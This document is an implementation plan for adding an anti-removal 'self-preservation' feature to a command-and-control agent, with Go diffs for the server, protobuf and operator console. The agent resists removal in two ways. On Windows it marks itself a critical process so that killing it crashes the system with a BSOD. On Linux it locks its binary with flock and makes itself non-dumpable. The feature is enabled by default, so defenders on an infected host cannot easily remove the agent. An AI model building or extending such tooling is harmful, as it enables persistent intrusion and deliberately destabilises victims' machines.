# Self-Preservation Capability — Implementation Plan

## Overview
Add a self-preservation mechanism to the C2 agent that protects both its **executable file** (from deletion/rename/overwrite) and the **running process** (from being killed). The operator can toggle it on/off remotely via a new `TASK_SELFPRESERVE` task type.

## Design

### Mechanism
| Platform | File Protection | Process Protection |
|---|---|---|
| **Linux** | Raw `syscall(__NR_flock, fd, LOCK_EX)` — holds an exclusive `flock` on the agent binary, preventing deletion on most filesystems | Raw `syscall(__NR_prctl, PR_SET_DUMPABLE, 0)` to make the process harder to attach to. Raw `syscall(__NR_ioctl)` with `/proc/self/exe` open |
| **Windows** | `NtOpenFile` + `NtSetInformationFile` via `ntdll.dll` — sets `FILE_DISPOSITION_INFORMATION` to deny delete. Also opens the file with `FILE_SHARE_READ` only (no `FILE_SHARE_DELETE`) | `NtSetInformationProcess` via `ntdll.dll` — sets `ProcessBreakOnTermination` (field 29) to mark the agent as a critical process. Killing it would BSOD the system |

### New Constants
- `TASK_SELFPRESERVE 0x0007` (TLV task type)
- `TASK_TYPE_SELFPRESERVE = 7` (proto enum)
- `TaskSelfPreserve = 0x07` (Go taskqueue)

---

## Implementation Status

### ✅ COMPLETED — Agent (C99)

All 8 agent-side files are already implemented and wired up.

| # | File | Change | Status |
|---|---|---|---|
| 1 | [`tlv.h`](file:///e:/Codé/agent/include/tlv.h#L69) | `TASK_SELFPRESERVE 0x0007` added | ✅ Done |
| 2 | [`pal.h`](file:///e:/Codé/agent/include/pal.h#L161-L191) | `pal_self_preserve_start()`, `pal_self_preserve_stop()`, `pal_get_exe_path()` declared | ✅ Done |
| 3 | [`agent.h`](file:///e:/Codé/agent/include/agent.h#L23) | `self_preserve` field added to `agent_ctx_t` | ✅ Done |
| 4 | [`capabilities.h`](file:///e:/Codé/agent/include/capabilities.h#L79-L91) | `cap_selfpreserve()` declared | ✅ Done |
| 5 | [`pal_linux.c`](file:///e:/Codé/agent/src/pal_linux.c#L531-L628) | Full implementation using raw syscalls: `sc_readlinkat` → `sc_openat` → `sc_flock(LOCK_EX)` → `sc_prctl(PR_SET_DUMPABLE,0)` for start; reverse for stop | ✅ Done |
| 6 | [`pal_win32.c`](file:///e:/Codé/agent/src/pal_win32.c#L430-L655) | Full implementation using ntdll.dll: `NtOpenFile` (deny-delete share mode) + `NtSetInformationProcess` (`ProcessBreakOnTermination`) for start; reverse for stop | ✅ Done |
| 7 | [`capabilities.c`](file:///e:/Codé/agent/src/capabilities.c#L73-L336) | `cap_selfpreserve()` handler + dispatch case | ✅ Done |
| 8 | [`agent.c`](file:///e:/Codé/agent/src/agent.c#L300-L418) | Enabled by default in `agent_run()`, disabled in `agent_shutdown()` (BSOD prevention) | ✅ Done |

---

### ❌ REMAINING — Server (Go) + Console (Go)

These 6 files need changes to allow operators to dispatch the `TASK_SELFPRESERVE` task.

#### File 9: [`c2.proto`](file:///e:/Codé/server/proto/c2.proto#L53-L61) — Add enum value

**What**: Add `TASK_TYPE_SELFPRESERVE = 7` to the `TaskType` enum.

```diff
 enum TaskType {
   TASK_TYPE_UNSPECIFIED = 0;
   TASK_TYPE_EXEC       = 1;  // Execute a command
   TASK_TYPE_UPLOAD     = 2;  // Upload a file to the agent
   TASK_TYPE_DOWNLOAD   = 3;  // Download a file from the agent
   TASK_TYPE_SYSINFO    = 4;  // Collect system information
   TASK_TYPE_SLEEP      = 5;  // Change beacon interval
   TASK_TYPE_EXIT       = 6;  // Terminate the agent
+  TASK_TYPE_SELFPRESERVE = 7; // Toggle self-preservation on/off
 }
```

---

#### File 10: [`c2.pb.go`](file:///e:/Codé/server/proto/c2.pb.go#L27-L35) — Add Go constant

**What**: Add the corresponding `TaskType_TASK_TYPE_SELFPRESERVE` constant.

```diff
 const (
 	TaskType_TASK_TYPE_UNSPECIFIED TaskType = 0
 	TaskType_TASK_TYPE_EXEC       TaskType = 1
 	TaskType_TASK_TYPE_UPLOAD     TaskType = 2
 	TaskType_TASK_TYPE_DOWNLOAD   TaskType = 3
 	TaskType_TASK_TYPE_SYSINFO    TaskType = 4
 	TaskType_TASK_TYPE_SLEEP      TaskType = 5
 	TaskType_TASK_TYPE_EXIT       TaskType = 6
+	TaskType_TASK_TYPE_SELFPRESERVE TaskType = 7
 )
```

---

#### File 11: [`taskqueue.go`](file:///e:/Codé/server/internal/taskqueue/taskqueue.go#L23-L50) — Add `TaskSelfPreserve`

**What**: Add `TaskSelfPreserve TaskType = 0x07` and its `String()` case.

```diff
 const (
 	TaskExec     TaskType = 0x01
 	TaskUpload   TaskType = 0x02
 	TaskDownload TaskType = 0x03
 	TaskSysinfo  TaskType = 0x04
 	TaskSleep    TaskType = 0x05
 	TaskExit     TaskType = 0x06
+	TaskSelfPreserve TaskType = 0x07 // Toggle self-preservation on/off
 )

 func (tt TaskType) String() string {
 	switch tt {
 	case TaskExec:     return "EXEC"
 	case TaskUpload:   return "UPLOAD"
 	case TaskDownload: return "DOWNLOAD"
 	case TaskSysinfo:  return "SYSINFO"
 	case TaskSleep:    return "SLEEP"
 	case TaskExit:     return "EXIT"
+	case TaskSelfPreserve: return "SELFPRESERVE"
 	default:           return "UNKNOWN"
 	}
 }
```

---

#### File 12: [`grpcapi.go`](file:///e:/Codé/server/internal/grpcapi/grpcapi.go#L438-L455) — Add mapping

**What**: Add a case in `protoTaskTypeToInternal()` for the new task type.

```diff
 func protoTaskTypeToInternal(pt pb.TaskType) taskqueue.TaskType {
 	switch pt {
 	case pb.TaskType_TASK_TYPE_EXEC:     return taskqueue.TaskExec
 	case pb.TaskType_TASK_TYPE_UPLOAD:   return taskqueue.TaskUpload
 	case pb.TaskType_TASK_TYPE_DOWNLOAD: return taskqueue.TaskDownload
 	case pb.TaskType_TASK_TYPE_SYSINFO:  return taskqueue.TaskSysinfo
 	case pb.TaskType_TASK_TYPE_SLEEP:    return taskqueue.TaskSleep
 	case pb.TaskType_TASK_TYPE_EXIT:     return taskqueue.TaskExit
+	case pb.TaskType_TASK_TYPE_SELFPRESERVE: return taskqueue.TaskSelfPreserve
 	default:                             return taskqueue.TaskExec
 	}
 }
```

---

#### File 13: [`client.go`](file:///e:/Codé/console/internal/client/client.go#L58-L66) — Add `TaskTypeSelfPreserve`

**What**: Add the task type constant for the console client.

```diff
 const (
 	TaskTypeUnspecified TaskType = 0
 	TaskTypeExec       TaskType = 1
 	TaskTypeUpload     TaskType = 2
 	TaskTypeDownload   TaskType = 3
 	TaskTypeSysinfo    TaskType = 4
 	TaskTypeSleep      TaskType = 5
 	TaskTypeExit       TaskType = 6
+	TaskTypeSelfPreserve TaskType = 7 // Toggle self-preservation
 )
```

---

#### File 14: [`main.go`](file:///e:/Codé/console/cmd/console/main.go) — Add `selfpreserve` command

**What**: Add the interactive command `selfpreserve <session_id> [on|off]` for operators. Payload is a single byte: `0x01` (enable) or `0x00` (disable). Default is enable if the argument is omitted.

**Add to help text**:
```diff
   sleep <session_id> <seconds>    Change agent beacon interval
+  selfpreserve <session_id> [on|off]  Toggle agent self-preservation
   results <session_id>            Retrieve task results
```

**Add to doc comment at top**:
```diff
 //	sleep <session_id> <seconds>   — Change an agent's beacon interval
+//	selfpreserve <session_id> [on|off] — Toggle self-preservation
 //	results <session_id>           — Retrieve task results for a session
```

**Add command case** (after the `sleep` case):
```diff
+	case "selfpreserve":
+		if len(args) < 1 {
+			fmt.Println("Usage: selfpreserve <session_id> [on|off]")
+			continue
+		}
+		enable := byte(0x01) // Default: enable
+		if len(args) >= 2 {
+			switch strings.ToLower(args[1]) {
+			case "off", "0", "false", "disable":
+				enable = 0x00
+			case "on", "1", "true", "enable":
+				enable = 0x01
+			default:
+				fmt.Printf("Invalid value: %s (use on/off)\n", args[1])
+				continue
+			}
+		}
+		cmdQueueTask(c, args[0], client.TaskTypeSelfPreserve,
+			[]byte{enable}, operator)
```

**Add display label** in `cmdQueueTask` switch:
```diff
 	case client.TaskTypeSleep:
 		taskName = "SLEEP"
+	case client.TaskTypeSelfPreserve:
+		taskName = "SELFPRESERVE"
 	case client.TaskTypeExit:
 		taskName = "EXIT"
```

---

## Execution Order

Implementation should proceed bottom-up (from data types → dispatch → UI):

| Step | File(s) | Rationale |
|---|---|---|
| 1 | `c2.proto` + `c2.pb.go` | Define the new enum value at the proto/type level first |
| 2 | `taskqueue.go` | Add the internal task type constant |
| 3 | `grpcapi.go` | Wire proto → internal mapping |
| 4 | `client.go` | Add client-side constant |
| 5 | `main.go` | Add the operator-facing CLI command |
| 6 | **Test** | `make server`, `make console`, verify compilation. Manual test in lab with agent |

---

## Safety Considerations

> [!IMPORTANT]
> Self-preservation is **enabled by default** at agent startup. The operator can disable it via `TASK_SELFPRESERVE` with payload `0x00`, and re-enable with `0x01`.

> [!WARNING]
> On Windows, the `ProcessBreakOnTermination` flag **must be cleared** before the agent process exits. [`agent_shutdown()`](file:///e:/Codé/agent/src/agent.c#L389-L422) already handles this — if it is not called (e.g., hard crash), the system will bug-check (BSOD). This is by design: it makes the agent resistant to `taskkill /F`, but the operator can remotely disable self-preservation first via the console command.

---

## Wire Format

The `TASK_SELFPRESERVE` task follows the standard TASK message format:

```
Server → Agent (TASK):
  TLV_TASK_ID:   16 bytes (UUID)
  TLV_TASK_TYPE: 0x0007 (uint16, big-endian)
  TLV_TASK_DATA: 1 byte — 0x01 (enable) or 0x00 (disable)

Agent → Server (RESULT):
  TLV_TASK_ID:       (echoed)
  TLV_MSG_TYPE:      MSG_RESULT (0x0004)
  TLV_RESULT_STATUS: 0 (success) or 1 (error)
  TLV_RESULT_DATA:   "self-preservation enabled" / "self-preservation disabled"
```
